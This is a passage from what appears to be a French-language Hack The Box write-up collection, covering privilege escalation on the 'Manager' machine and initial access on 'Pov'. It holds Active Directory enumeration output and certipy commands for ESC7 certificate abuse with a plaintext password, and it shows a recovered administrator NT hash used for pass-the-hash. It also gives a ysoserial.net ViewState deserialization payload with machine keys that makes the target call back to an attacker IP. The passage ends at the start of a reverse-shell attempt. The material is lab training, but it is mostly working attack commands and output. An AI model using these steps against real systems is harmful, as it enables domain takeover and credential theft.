'MANAGER\\Domain Users' has enrollment rights for template 'EFS'\nTemplate Name:                          EFS\nTemplate distinguishedname:             CN=EFS,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\nExtended Key Usage:                     Encrypting File System\nEnrollmentFlag:                         INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT\nCertificateNameFlag:                    SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH\n[+] Enrollment allowed for:             MANAGER\\Domain Users\n\n[?] +++++ Checking Template 'DomainController' +++++\n\n[?] +++++ Checking Template 'WebServer' +++++\n[!] Template 'WebServer' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'\nTemplate Name:                          WebServer\nTemplate distinguishedname:             CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\nExtended Key Usage:                     Server Authentication\nEnrollmentFlag:                         0\n[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT\n\n[?] +++++ Checking Template 'Machine' +++++\n[+] Identity 'MANAGER\\Domain Computers' has enrollment rights for template 'Machine'\nTemplate Name:                          Machine\nTemplate distinguishedname:             CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\n[+] Extended Key Usage:                 Client Authentication, Server Authentication\nEnrollmentFlag:                         AUTO_ENROLLMENT\nCertificateNameFlag:                    SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN\n[+] Enrollment allowed for:             MANAGER\\Domain Computers\n\n[?] +++++ Checking Template 'User' +++++\n[+] Identity 'MANAGER\\Domain Users' has enrollment rights for template 'User'\nTemplate Name:                          User\nTemplate distinguishedname:             CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb\nDate of Creation:                       07/27/2023 10:31:05\n[+] Extended Key Usage:                 Encrypting File System, Secure E-mail, Client Authentication\nEnrollmentFlag:                         INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT\nCertificateNameFlag:                    SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH\n[+] Enrollment allowed for:             MANAGER\\Domain Users\n\n[?] +++++ Checking Template 'Administrator' +++++\n\n[?] +++++ Searching for Credentials Exposure +++++\n\n[?] +++++ Searching for ASREProastable User +++++\n\n[?] +++++ Searching for Kerberoastable User +++++\n\n[?] +++++ Searching for User with 'Linux/Unix Password' attribute +++++\n\n[?] +++++ Searching for Computer with enabled and readable LAPS attribute +++++\n\n[?] +++++ Searching for Group Managed Service Account (gMSA) +++++\n\n[?] +++++ Searching for Credentials in SYSVOL Group Policy Files +++++\n\n[?] +++++ Searching for Sensitive Information in NETLOGON Share +++++\n\n[?] +++++ Searching for Delegation Issues +++++\n\n[?] +++++ Searching for Computer with Unconstrained Delegation Rights +++++\n\n[?] +++++ Searching for Computer with Constrained Delegation Rights +++++\n\n[?] +++++ Searching for Computer with Resource-Based Constrained Delegation Rights +++++\n\n[?] +++++ Searching for User with Constrained Delegation Rights +++++\n\n[?] +++++ Searching for User with Resource-Based Constrained Delegation Rights +++++\n\n[?] +++++ Starting Account Enumeration +++++\n\n[?] +++++ Searching for Azure AD Connect +++++\n\n[?] +++++ Searching for Users in High Privileged Groups +++++\n[+] Found members in group 'BUILTIN\\Administrators':\nGroupName:                              Enterprise Admins\ndistinguishedName:                      CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-519\n[+] description:                        Designated administrators of the enterprise\n\nGroupName:                              Domain Admins\ndistinguishedName:                      CN=Domain Admins,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-512\n[+] description:                        Designated administrators of the domain\n\nsAMAccountName:                         Administrator\ndistinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500\nmemberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb\n                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb\n[+] description:                        Built-in account for administering the computer/domain\n[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00\npwdLastSet:                             07/27/2023 08:24:35\nlastLogonTimestamp:                     02/20/2024 11:40:08\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED\n[+] admincount:                         This identity is or was member of a high privileged admin group\n\n[+] Found members in group 'MANAGER\\Domain Admins':\nsAMAccountName:                         Administrator\ndistinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500\nmemberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb\n                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb\n[+] description:                        Built-in account for administering the computer/domain\n[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00\npwdLastSet:                             07/27/2023 08:24:35\nlastLogonTimestamp:                     02/20/2024 11:40:08\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED\n[+] admincount:                         This identity is or was member of a high privileged admin group\n\n[+] Found members in group 'MANAGER\\Enterprise Admins':\nsAMAccountName:                         Administrator\ndistinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500\nmemberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb\n                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb\n[+] description:                        Built-in account for administering the computer/domain\n[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00\npwdLastSet:                             07/27/2023 08:24:35\nlastLogonTimestamp:                     02/20/2024 11:40:08\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED\n[+] admincount:                         This identity is or was member of a high privileged admin group\n\n[+] Found members in group 'MANAGER\\Group Policy Creator Owners':\nsAMAccountName:                         Administrator\ndistinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500\nmemberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb\n                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb\n                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb\n[+] description:                        Built-in account for administering the computer/domain\n[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00\npwdLastSet:                             07/27/2023 08:24:35\nlastLogonTimestamp:                     02/20/2024 11:40:08\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED\n[+] admincount:                         This identity is or was member of a high privileged admin group\n\n[+] Found members in group 'BUILTIN\\Access Control Assistance Operators':\nsAMAccountName:                         Raven\ndistinguishedName:                      CN=Raven,CN=Users,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1116\nmemberOf:                               CN=Remote Management Users,CN=Builtin,DC=manager,DC=htb\npwdLastSet:                             07/27/2023 08:23:10\nlastLogonTimestamp:                     02/22/2024 12:13:56\nuserAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\n\n[+] Found members in group 'MANAGER\\Cert Publishers':\nsAMAccountName:                         DC01$\ndistinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000\noperatingsystem:                        Windows Server 2019 Standard\nmemberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb\npwdLastSet:                             10/16/2023 14:00:03\nlastLogonTimestamp:                     02/20/2024 11:39:17\n[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION\n\n\n[?] +++++ Searching for High Privileged Users with a password older 5 years +++++\n\n[?] +++++ Searching for High Privileged User which may not require a Password +++++\n\n[?] +++++ Starting Computer Enumeration +++++\n\n[?] +++++ Searching for Domain Controllers +++++\n[+] Found Domain Controller 'DC01$':\nsAMAccountName:                         DC01$\ndistinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000\noperatingsystem:                        Windows Server 2019 Standard\nmemberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb\npwdLastSet:                             10/16/2023 14:00:03\nlastLogonTimestamp:                     02/20/2024 11:39:17\n[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION\n\n\n[?] +++++ Searching for Exchange Servers +++++\n\n[?] +++++ Searching for ADCS Servers +++++\n[+] Found ADCS Server 'DC01$':\nsAMAccountName:                         DC01$\ndistinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000\noperatingsystem:                        Windows Server 2019 Standard\nmemberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb\npwdLastSet:                             10/16/2023 14:00:03\nlastLogonTimestamp:                     02/20/2024 11:39:17\n[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION\n\n\n[?] +++++ Searching for Outdated Operating Systems +++++\n\n[?] +++++ Searching for Detailed Active Directory Information with BloodHound +++++\n</code></pre> <p>Je pense que cela va tourner autour des certificats :)... Uploadons certify.exe, ce sera peut-\u00eatre utile.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt; .\\Certify.exe find /vulnerable\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n[*] Action: Find certificate templates\n[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'\n\n[*] Listing info about the Enterprise CA 'manager-DC01-CA'\n\n    Enterprise CA Name            : manager-DC01-CA\n    DNS Hostname                  : dc01.manager.htb\n    FullName                      : dc01.manager.htb\\manager-DC01-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb\n    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023\n    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB\n    Cert Start Date               : 7/27/2023 3:21:05 AM\n    Cert End Date                 : 7/27/2122 3:31:04 AM\n    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb\n    UserSpecifiedSAN              : Disabled\n    CA Permissions                :\n      Owner: BUILTIN\\Administrators        S-1-5-32-544\n\n      Access Rights                                     Principal\n\n      Deny   ManageCA, Read                             MANAGER\\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119\n      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11\n      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544\n      Allow  ManageCA, ManageCertificates               MANAGER\\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512\n      Allow  ManageCA, ManageCertificates               MANAGER\\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519\n      Allow  ManageCA, Enroll                           MANAGER\\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116\n      Allow  Enroll                                     MANAGER\\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119\n    Enrollment Agent Restrictions : None\n\n[+] No Vulnerable Certificates Templates found!\n\n\n\nCertify completed in 00:00:08.0592263\n</code></pre>"},{"location":"Writeup/HTB/Machines/Manager/#privesc-admin-esc7","title":"Privesc Admin - ESC7","text":"<p>On dirait qu'on a tout ce qu'il faut pour abuser des certificats, let's go !</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Successfully added officer 'Raven' on 'manager-DC01-CA'\n\npak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'\n\npak@DESKTOP-AF1CU53:~/tmp$ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.\n[*] Request ID is 13\nWould you like to save the private key? (y/N) y\n[*] Saved private key to 13.key\n[-] Failed to request certificate\n\npak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca \"manager-DC01-CA\" -issue-request 13 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!\n123'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Successfully issued certificate\n\npak@DESKTOP-AF1CU53:~/tmp$ certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca \"manager-DC01-CA\" -target manager.htb -retrieve 13\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Rerieving certificate with ID 13\n[*] Successfully retrieved certificate\n[*] Got certificate with UPN 'administrator@manager.htb'\n[*] Certificate has no object SID\n[*] Loaded private key from '13.key'\n[*] Saved certificate and private key to 'administrator.pfx'\n</code></pre> <p>Puis on r\u00e9cup\u00e8re le hash de l'administrateur :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ certipy auth -pfx administrator.pfx\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@manager.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef\n</code></pre> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ crackmapexec smb 10.129.5.92 -u administrator -H 'ae5064c2f62317332c88629e025924ef'\nSMB         10.129.5.92     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.129.5.92     445    DC01             [+] manager.htb\\administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)\n</code></pre>"},{"location":"Writeup/HTB/Machines/Pov/","title":"Pov","text":"Room Pov Url https://app.hackthebox.com/machines/Pov Sujets Web/Windows Active/Retired lors de la r\u00e9solution Active Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Pov/#nmap","title":"Nmap","text":"<pre><code>pak@laptop:~$ nmap -p- -A -vv 10.129.39.248\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 20:13 CET\nNSE: Loaded 156 scripts for scanning.\nNSE: Script Pre-scanning.\nNSE: Starting runlevel 1 (of 3) scan.\nInitiating NSE at 20:14\nCompleted NSE at 20:14, 0.00s elapsed\nNSE: Starting runlevel 2 (of 3) scan.\nInitiating NSE at 20:14\nCompleted NSE at 20:14, 0.00s elapsed\nNSE: Starting runlevel 3 (of 3) scan.\nInitiating NSE at 20:14\nCompleted NSE at 20:14, 0.00s elapsed\nInitiating Ping Scan at 20:14\nScanning 10.129.39.248 [2 ports]\nCompleted Ping Scan at 20:14, 0.02s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 20:14\nCompleted Parallel DNS resolution of 1 host. at 20:14, 0.00s elapsed\nInitiating Connect Scan at 20:14\nScanning 10.129.39.248 [65535 ports]\nDiscovered open port 80/tcp on 10.129.39.248\nConnect Scan Timing: About 20.42% done; ETC: 20:16 (0:02:01 remaining)\nConnect Scan Timing: About 48.81% done; ETC: 20:16 (0:01:04 remaining)\nCompleted Connect Scan at 20:15, 104.45s elapsed (65535 total ports)\nInitiating Service scan at 20:15\nScanning 1 service on 10.129.39.248\nCompleted Service scan at 20:15, 7.08s elapsed (1 service on 1 host)\nNSE: Script scanning 10.129.39.248.\nNSE: Starting runlevel 1 (of 3) scan.\nInitiating NSE at 20:15\nCompleted NSE at 20:15, 5.06s elapsed\nNSE: Starting runlevel 2 (of 3) scan.\nInitiating NSE at 20:15\nCompleted NSE at 20:15, 0.20s elapsed\nNSE: Starting runlevel 3 (of 3) scan.\nInitiating NSE at 20:15\nCompleted NSE at 20:15, 0.00s elapsed\nNmap scan report for 10.129.39.248\nHost is up, received syn-ack (0.022s latency).\nScanned at 2024-03-20 20:14:00 CET for 117s\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE REASON  VERSION\n80/tcp open  http    syn-ack Microsoft IIS httpd 10.0\n|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E\n| http-methods:\n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-title: pov.htb\n|_http-server-header: Microsoft-IIS/10.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>Uniquement du web. C'est pas ce que je pr\u00e9f\u00e8re... </p> <p>Enum\u00e9ration des sous-domaines :</p> <pre><code>pak@laptop:~$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://10.129.39.248 -H \"HOST: FUZZ.pov.htb\" -fs 12330\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.129.39.248\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt\n :: Header           : Host: FUZZ.pov.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 12330\n________________________________________________\n\nceop                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 981ms]\ndev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 8638ms]\n:: Progress: [151265/151265] :: Job [1/1] :: 1212 req/sec :: Duration: [0:05:49] :: Errors: 0 ::\n</code></pre> <p>Un fuzzing des r\u00e9pertoires sur les diff\u00e9rents sous-domaine n'a rien donn\u00e9, nuclei non plus.</p> <p>Sur le domaine dev.pov.htb j'ai pu remarquer qu'un cv \u00e9tait t\u00e9l\u00e9chargeable : il est possible, en interceptant la requ\u00eate, de faire une LFI :</p> <p></p> <p>J'ai alors tent\u00e9 d'inclure divers fichiers, mais rien de probant... J'ai donc cherch\u00e9 si ce type de requ\u00eate ne permettait pas un exploit, et j'ai vu que \u00e7a parlait d'ysoserial.net. </p> <p>Je tente de crafter une commande un peu au pif avec les informations que j'ai :</p> <pre><code>PS D:\\Tools\\ysoserial.net\\ysoserial\\bin\\Release&gt; .\\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c \"powershell.exe Invoke-WebRequest -Uri http://10.10.16.17:8000\" --path=\"/portfolio/default.aspx\" --apppath=\"/\" --decryptionalg=\"AES\" --decryptionkey=\"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43\"  --validationalg=\"SHA1\" --validationkey=\"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\"\nYNa532yBv%2FlsMHA6tJ9jFqnu6cXCxIpf7jKmwNer2V%2BxakQ3G1SaO45wS9HKm%2BxrQcWEplWD8ShUNabrgBvRgL2%2F6XqdZsgl1B6SJHWQ807e46t5CSL5%2B4FQ76tqNr9E3ypt7wCxJjY5j18qYcLhH22FHFTAEckUKSYJjngs%2FIBaRgcsgpmCyWdU7Cfs0caxWRiM%2BN0Gfkssrj%2F%2B20WU8XOHK3rnQWtbWIww3%2BK61tbZnDBnXWDsl%2F9vz1DA7AROMnHnG1eEk%2Fcxbpe%2BKhEa15jc2wi4sf93rpIBbSvzX4EporsFOreHlRMOAnKPir5M1b6c2idwNRCk%2BROo0NAPwTHjIQYOJGYteDhKUviR%2Bj9pCzZRhx5OFBe6w1dhSdwyjzK3lPWY3THWQn2Cfoor%2B1kPd8urzk6QgXY%2FoyTmCHMqE4F2PGzOS25w5mkhIXcO%2Fc%2FVTfnf81DyciCy1pybEUy2I%2FS6xhV25i2gD83xUfjmQ4YV9VEE4mEiCCflt44O2K3DZXJcODo1eSV7ok%2B8AxWycEVxFhGJ6RCmzXUTVV7yAI6c1jKVaqCSnlvCoZ5PFpoidVCr95gTqwoO5a%2F3Wq0nMib82cr6hDgk0M42Nb1Yx3V5uENai2IiTVsDVqz22yQpFTGEAWrZ%2BU5lOTC0aXr5YHK1gj4G0A15o89JYHazYsB8fFzTycJmTzuCuWBEuf%2FJ0duKMhoSXw2gPaACgwSnKLjZ4eIdn%2BOomUcZ1jH712kdI0izP22JSqRNdgSwbajfpp3TPNmuEtTpnGak5YUKnnCdrvEr8panBgz86AjA7Mvt6ovDrhzuOpO7sOh%2FP8hoPjBNzIwbTrlYS0lyB7mce7X%2FgYYzCUNYOaBKeMrNwNf7CHHeW%2BA1R0ptuL16CBPxAZt1oB8ztWXSXkqBhbesi5ev4PMqdjCNMETg6Igzor2jGf8YdYg0yJZrcfRWcOIJ93ApcLY6DYynuB0SDmfwACZEhR%2FnJFwT2gGlOBulCqyRS37bo7PcwrIZYs0x%2BPjT9vvNIqsWMg8P5iV0WPpFHSSPtN3x6wcljCWIspRL3NIePDHpXA99lLPYuslzlVqmF8azLdNOAaJqYHba2n%2FRPItCBQgNTDZ6mThDkEN1MHoLpM2NNuNw5s0lKvsI26U22oXkZPgvAM6%2BlIL4Qmt%2FluiHttz%2FkNoWegBnEykRrWVhNMYj6ssQNaA6Vknvrml6qDvhC6dH%2F%2FXE%2F9RVXeJilpF5hLZO5Ak1OUmISktTK3JF8k5tkVwmdOyl3SMqXwytU2B3PIiLYhZ3d8o5kwo2zgBHQZ%2F0MHHss5Lab0FnAhhYifQY0X6klIWRbVS0a17FOQ%3D%3D\n</code></pre> <pre><code>POST /portfolio/ HTTP/1.1\nHost: dev.pov.htb\nContent-Length: 1700\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://dev.pov.htb\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://dev.pov.htb/portfolio/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n__EVENTTARGET=download&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=YNa532yBv%2FlsMHA6tJ9jFqnu6cXCxIpf7jKmwNer2V%2BxakQ3G1SaO45wS9HKm%2BxrQcWEplWD8ShUNabrgBvRgL2%2F6XqdZsgl1B6SJHWQ807e46t5CSL5%2B4FQ76tqNr9E3ypt7wCxJjY5j18qYcLhH22FHFTAEckUKSYJjngs%2FIBaRgcsgpmCyWdU7Cfs0caxWRiM%2BN0Gfkssrj%2F%2B20WU8XOHK3rnQWtbWIww3%2BK61tbZnDBnXWDsl%2F9vz1DA7AROMnHnG1eEk%2Fcxbpe%2BKhEa15jc2wi4sf93rpIBbSvzX4EporsFOreHlRMOAnKPir5M1b6c2idwNRCk%2BROo0NAPwTHjIQYOJGYteDhKUviR%2Bj9pCzZRhx5OFBe6w1dhSdwyjzK3lPWY3THWQn2Cfoor%2B1kPd8urzk6QgXY%2FoyTmCHMqE4F2PGzOS25w5mkhIXcO%2Fc%2FVTfnf81DyciCy1pybEUy2I%2FS6xhV25i2gD83xUfjmQ4YV9VEE4mEiCCflt44O2K3DZXJcODo1eSV7ok%2B8AxWycEVxFhGJ6RCmzXUTVV7yAI6c1jKVaqCSnlvCoZ5PFpoidVCr95gTqwoO5a%2F3Wq0nMib82cr6hDgk0M42Nb1Yx3V5uENai2IiTVsDVqz22yQpFTGEAWrZ%2BU5lOTC0aXr5YHK1gj4G0A15o89JYHazYsB8fFzTycJmTzuCuWBEuf%2FJ0duKMhoSXw2gPaACgwSnKLjZ4eIdn%2BOomUcZ1jH712kdI0izP22JSqRNdgSwbajfpp3TPNmuEtTpnGak5YUKnnCdrvEr8panBgz86AjA7Mvt6ovDrhzuOpO7sOh%2FP8hoPjBNzIwbTrlYS0lyB7mce7X%2FgYYzCUNYOaBKeMrNwNf7CHHeW%2BA1R0ptuL16CBPxAZt1oB8ztWXSXkqBhbesi5ev4PMqdjCNMETg6Igzor2jGf8YdYg0yJZrcfRWcOIJ93ApcLY6DYynuB0SDmfwACZEhR%2FnJFwT2gGlOBulCqyRS37bo7PcwrIZYs0x%2BPjT9vvNIqsWMg8P5iV0WPpFHSSPtN3x6wcljCWIspRL3NIePDHpXA99lLPYuslzlVqmF8azLdNOAaJqYHba2n%2FRPItCBQgNTDZ6mThDkEN1MHoLpM2NNuNw5s0lKvsI26U22oXkZPgvAM6%2BlIL4Qmt%2FluiHttz%2FkNoWegBnEykRrWVhNMYj6ssQNaA6Vknvrml6qDvhC6dH%2F%2FXE%2F9RVXeJilpF5hLZO5Ak1OUmISktTK3JF8k5tkVwmdOyl3SMqXwytU2B3PIiLYhZ3d8o5kwo2zgBHQZ%2F0MHHss5Lab0FnAhhYifQY0X6klIWRbVS0a17FOQ%3D%3D&amp;__VIEWSTATEGENERATOR=8E0F0FA3&amp;__EVENTVALIDATION=xN4J%2BRqc7RjO%2B6DYMdmQNNDEgW%2BSOBDBxJ8EOv5lnZNXpLq1GZ0JN64wjzyQBFoOX2P2kvacbe2wut%2BUD3MCqWdIPwR5SNj6vH5SMqgj6kvWWaTT8Usz%2BEAoIRycUBA2ZfzxEg%3D%3D&amp;file=/web.config\n</code></pre> <p>Et l'appel est bien re\u00e7u, nice !</p> <pre><code>pak@laptop:~$ nc -lnvp 8000\nlistening on [any] 8000 ...\nconnect to [10.10.16.17] from (UNKNOWN) [10.129.39.248] 49671\nGET / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.5328\nHost: 10.10.16.17:8000\nConnection: Keep-Alive\n</code></pre> <p>Le reverse-shell est donc tent\u00e9 :</p> <pre><code>PS D:\\Tools\\ysoserial.net\\ysoserial\\bin\\Release&gt; .\\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c \"powershel\nl -e 